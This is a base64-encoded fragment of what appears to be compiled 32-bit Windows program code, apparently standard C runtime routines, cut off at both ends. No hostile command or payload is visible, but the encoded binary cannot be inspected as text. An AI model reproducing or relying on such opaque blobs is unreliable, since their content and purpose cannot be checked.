AABbQAAABQ/9ZeW4vHX13Dhf90N4XAdDNWizA793QoV4k46MH+//9ZhfZ0G1boRf///4M+AFl1D4H+UBtBAHQHVuhZ/f//WYvHXsMzwMNqDGgw/EAA6D7C///obvD//4vwoUQbQQCFRnB0IoN+bAB0HOhX8P//i3BshfZ1CGog6BXh//9Zi8boUcL//8NqDOjnFQAAWYNl/ACNRmyLPSgcQQDoaf///4lF5MdF/P7////oAgAAAOvBagzo4hQAAFmLdeTDi/9Vi+yD7BChBBBBADPFiUX8U1aLdQz2RgxAVw+FNgEAAFboQMb//1m70BVBAIP4/3QuVugvxv//WYP4/nQiVugjxv//wfgFVo08haArQQDoE8b//4PgH1nB4AYDB1nrAovDikAkJH88Ag+E6AAAAFbo8sX//1mD+P90Llbo5sX//1mD+P50Ilbo2sX//8H4BVaNPIWgK0EA6MrF//+D4B9ZweAGAwdZ6wKLw4pAJCR/PAEPhJ8AAABW6KnF//9Zg/j/dC5W6J3F//9Zg/j+dCJW6JHF///B+AVWjTyFoCtBAOiBxf//g+AfWcHgBgMHWesCi8P2QASAdF3/dQiNRfRqBVCNRfBQ6DtJAACDxBCFwHQHuP//AADrXTP/OX3wfjD/TgR4EosGikw99IgIiw4PtgFBiQ7rDg++RD30VlDoWLX//1lZg/j/dMhHO33wfNBmi0UI6yCDRgT+eA2LDotFCGaJAYMGAusND7dFCFZQ6PJFAABZWYtN/F9eM81b6HOl///Jw4v/Vlcz/423QBxBAP826Kjr//+DxwRZiQaD/yhy6F9ew4v/VYvsVlcz9v91COgESQAAi/hZhf91JzkF6ChBAHYfVv8VKOBAAI2G6AMAADsF6ChBAHYDg8j/i/CD+P91yovHX15dw4v/VYvsVlcz9moA/3UM/3UI6IRJAACL+IPEDIX/dSc5BegoQQB2H1b/FSjgQACNhugDAAA7BegoQQB2A4PI/4vwg/j/dcOLx19eXcOL/1WL7FZXM/b/dQz/dQjoWEoAAIv4WVmF/3UsOUUMdCc5BegoQQB2H1b/FSjgQACNhugDAAA7BegoQQB2A4PI/4vwg/j/dcGLx19eXcOhBBBBAIPIATPJOQXsKEEAD5TBi8HDzMzMzMzMzMzMzMyLTCQE98EDAAAAdCSKAYPBAYTAdE73wQMAAAB17wUAAAAAjaQkAAAAAI2kJAAAAACLAbr//v5+A9CD8P8zwoPBBKkAAQGBdOiLQfyEwHQyhOR0JKkAAP8AdBOpAAAA/3QC682NQf+LTCQEK8HDjUH+i0wkBCvBw41B/YtMJAQrwcONQfyLTCQEK8HDi/9Vi+yD7BBTVot1DDPbO/N0FTldEHQQOB51EotFCDvDdAUzyWaJCDPAXlvJw/91FI1N8OiVtP//i0XwOVgUdR+LRQg7w3QHZg+2DmaJCDhd/HQHi0X4g2Bw/TPAQOvKjUXwUA+2BlDoxAAAAFlZhcB0fYtF8IuIrAAAAIP5AX4lOU0QfCAz0jldCA+VwlL/dQhRVmoJ/3AE/xVk4EAAhcCLRfB1EItNEDuIrAAAAHIgOF4BdBuLgKwAAAA4XfwPhGX///+LTfiDYXD96Vn////orLH//8cAKgAAADhd/HQHi0X4g2Bw/YPI/+k6////M8A5XQgPlcBQ/3UIi0XwagFWagn/cAT/FWTgQACFwA+FOv///+u6i/9Vi+xqAP91EP91DP91COjU/v//g8QQXcOL/1WL7IPsEP91DI1N8OiKs///D7ZFCItN8IuJyAAAAA+3BEElAIAAAIB9/AB0B4tN+INhcP3Jw4v/VYvsagD/dQjouf///1lZXcOL/1WL7PZADEB0BoN4CAB0GlD/dQjoN/v//1lZuf//AABmO8F1BYMO/13D/wZdw4v/VYvsVovw6xT/dQiLRRD/TQzouf///4M+/1l0BoN9DAB/5l5dw4v/VYvs9kcMQFNWi/CL2XQ3g38IAHUxi0UIAQbrMA+3A/9NCFCLx+h+////Q0ODPv9ZdRTod7D//4M4KnUQaj+Lx+hj////WYN9CAB/0F5bXcOL/1WL7IHsdAQAAKEEEEEAM8WJRfxTi10UVot1CDPAV/91EIt9DI2NtPv//4m1xPv//4md6Pv//4mFrPv//4mF+Pv//4mF1Pv//4mF9Pv//4mF3Pv//4mFsPv//4mF2Pv//+hDsv//hfZ1Nejur///xwAWAAAAM8BQUFBQUOh0r///g8QUgL3A+///AHQKi4W8+///g2Bw/YPI/+nPCgAAM/Y7/nUS6LOv//9WVlZWxwAWAAAAVuvFD7cPibXg+///ibXs+///ibXM+///ibWo+///iY3k+///ZjvOD4R0CgAAagJaA/o5teD7//+JvaD7//8PjEgKAACNQeBmg/hYdw8Pt8EPtoBI80AAg+AP6wIzwIu1zPv//2vACQ+2hDBo80AAagjB6AReiYXM+///O8YPhDP///+D+AcPh90JAAD/JIWfgkAAM8CDjfT7////iYWk+///iYWw+///iYXU+///iYXc+///iYX4+///iYXY+///6bAJAAAPt8GD6CB0SIPoA3Q0K8Z0JCvCdBSD6AMPhYYJAAAJtfj7///phwkAAION+Pv//wTpewkAAION+Pv//wHpbwkAAIGN+Pv//4AAAADpYAkAAAmV+Pv//+lVCQAAZoP5KnUriwODwwSJnej7//+JhdT7//+FwA+NNgkAAION+Pv//wT3ndT7///pJAkAAIuF1Pv//2vACg+3yY1ECNCJhdT7///pCQkAAIOl9Pv//wDp/QgAAGaD+Sp1JYsDg8MEiZ3o+///iYX0+///hcAPjd4IAACDjfT7////6dIIAACLhfT7//9rwAoPt8mNRAjQiYX0+///6bcIAAAPt8GD+El0UYP4aHRAg/hsdBiD+HcPhZwIAACBjfj7//8ACAAA6Y0IAABmgz9sdRED+oGN+Pv//wAQAADpdggAAION+Pv//xDpaggAAION+Pv//yDpXggAAA+3B2aD+DZ1GWaDfwI0dRKDxwSBjfj7//8AgAAA6TwIAABmg/gzdRlmg38CMnUSg8cEgaX4+////3///+kdCAAAZoP4ZA+EEwgAAGaD+GkPhAkIAABmg/hvD4T/BwAAZoP4dQ+E9QcAAGaD+HgPhOsHAABmg/hYD4ThBwAAg6XM+///AIuFxPv//1GNteD7///Hhdj7//8BAAAA6Oz7//9Z6bgHAAAPt8GD+GQPjzACAAAPhL0CAACD+FMPjxsBAAB0foPoQXQQK8J0WSvCdAgrwg+F7AUAAIPBIMeFpPv//wEAAACJjeT7//+Djfj7//9Ag730+///AI21/Pv//7gAAgAAibXw+///iYXs+///D42NAgAAx4X0+///BgAAAOnpAgAA94X4+///MAgAAA+FyQAAAION+Pv//yDpvQAAAPeF+Pv//zAIAAB1B4ON+Pv//yCLvfT7//+D//91Bb////9/g8ME9oX4+///IImd6Pv//4tb/Imd8Pv//w+EBQUAAIXbdQuhOBxBAImF8Pv//4Ol7Pv//wCLtfD7//+F/w+OHQUAAIoGhMAPhBMFAACNjbT7//8PtsBRUOiA+v//WVmFwHQBRkb/hez7//85vez7//980OnoBAAAg+hYD4TwAgAAK8IPhJUAAACD6AcPhPX+//8rwg+FxgQAAA+3A4PDBDP2RvaF+Pv//yCJtdj7//+Jnej7//+JhZz7//90QoiFyPv//42FtPv//1CLhbT7///Ghcn7//8A/7CsAAAAjYXI+///UI2F/Pv//1Dou/j//4PEEIXAfQ+JtbD7///rB2aJhfz7//+Nhfz7//+JhfD7//+Jtez7///pQgQAAIsDg8MEiZ3o+///hcB0OotIBIXJdDP3hfj7//8ACAAAD78AiY3w+///dBKZK8LHhdj7//8BAAAA6f0DAACDpdj7//8A6fMDAAChOBxBAImF8Pv//1Doqff//1np3AMAAIP4cA+P9gEAAA+E3gEAAIP4ZQ+MygMAAIP4Zw+O6P3//4P4aXRtg/hudCSD+G8Pha4DAAD2hfj7//+AibXk+///dGGBjfj7//8AAgAA61WLM4PDBImd6Pv//+gj9///hcAPhFb6///2hfj7//8gdAxmi4Xg+///ZokG6wiLheD7//+JBseFsPv//wEAAADpwQQAAION+Pv//0DHheT7//8KAAAA94X4+///AIAAAA+EqwEAAAPei0P4i1P86ecBAAB1EmaD+Wd1Y8eF9Pv//wEAAADrVzmF9Pv//34GiYX0+///gb30+///owAAAH49i730+///gcddAQAAV+ii9f//WYuN5Pv//4mFqPv//4XAdBCJhfD7//+Jvez7//+L8OsKx4X0+///owAAAIsDg8MIiYWU+///i0P8iYWY+///jYW0+///UP+1pPv//w++wf+19Pv//4md6Pv//1D/tez7//+NhZT7//9WUP81WBxBAOhC4f//Wf/Qi534+///g8QcgeOAAAAAdCGDvfT7//8AdRiNhbT7//9QVv81ZBxBAOgS4f//Wf/QWVlmg73k+///Z3Uchdt1GI2FtPv//1BW/zVgHEEA6Ozg//9Z/9BZWYA+LXURgY34+///AAEAAEaJtfD7//9W6Qj+//+JtfT7///Hhaz7//8HAAAA6ySD6HMPhGr8//8rwg+Eiv7//4PoAw+FyQEAAMeFrPv//ycAAAD2hfj7//+Ax4Xk+///EAAAAA+Eav7//2owWGaJhdD7//+Lhaz7//+DwFFmiYXS+///iZXc+///6UX+///3hfj7//8AEAAAD4VF/v//g8ME9oX4+///IHQc9oX4+///QImd6Pv//3QGD79D/OsED7dD/JnrF/aF+Pv//0CLQ/x0A5nrAjPSiZ3o+///9oX4+///QHQbhdJ/F3wEhcBzEffYg9IA99qBjfj7//8AAQAA94X4+///AJAAAIvai/h1AjPbg730+///AH0Mx4X0+///AQAAAOsag6X4+///97gAAgAAOYX0+///fgaJhfT7//+LxwvDdQYhhdz7//+Ntfv9//+LhfT7////jfT7//+FwH8Gi8cLw3Qti4Xk+///mVJQU1fouKf//4PBMIP5OYmdkPv//4v4i9p+BgONrPv//4gOTuu9jYX7/f//K8ZG94X4+///AAIAAImF7Pv//4m18Pv//3RZhcB0B4vOgDkwdE7/jfD7//+LjfD7///GATBA6zaF23ULoTwcQQCJhfD7//+LhfD7///Hhdj7//8BAAAA6wlPZoM4AHQGA8KF/3XzK4Xw+///0fiJhez7//+DvbD7//8AD4VlAQAAi4X4+///qEB0K6kAAQAAdARqLesOqAF0BGor6waoAnQUaiBYZomF0Pv//8eF3Pv//wEAAACLndT7//+Ltez7//8r3iud3Pv///aF+Pv//wx1F/+1xPv//42F4Pv//1NqIOiE9f//g8QM/7Xc+///i73E+///jYXg+///jY3Q+///6Iv1///2hfj7//8IWXQb9oX4+///BHUSV1NqMI2F4Pv//+hC9f//g8QMg73Y+///AHV1hfZ+cYu98Pv//4m15Pv///+N5Pv//42FtPv//1CLhbT7////sKwAAACNhZz7//9XUOhV8///g8QQiYWQ+///hcB+Kf+1nPv//4uFxPv//4214Pv//+it9P//A72Q+///g73k+///AFl/puscg43g+////+sTi43w+///Vo2F4Pv//+jW9P//WYO94Pv//wB8IPaF+Pv//wR0F/+1xPv//42F4Pv//1NqIOiI9P//g8QMg72o+///AHQT/7Wo+///6MDN//+Dpaj7//8AWYu9oPv//4ud6Pv//w+3BzP2iYXk+///ZjvGdAeLyOmh9f//ObXM+///dA2Dvcz7//8HD4VQ9f//gL3A+///AHQKi4W8+///g2Bw/YuF4Pv//4tN/F9eM81b6C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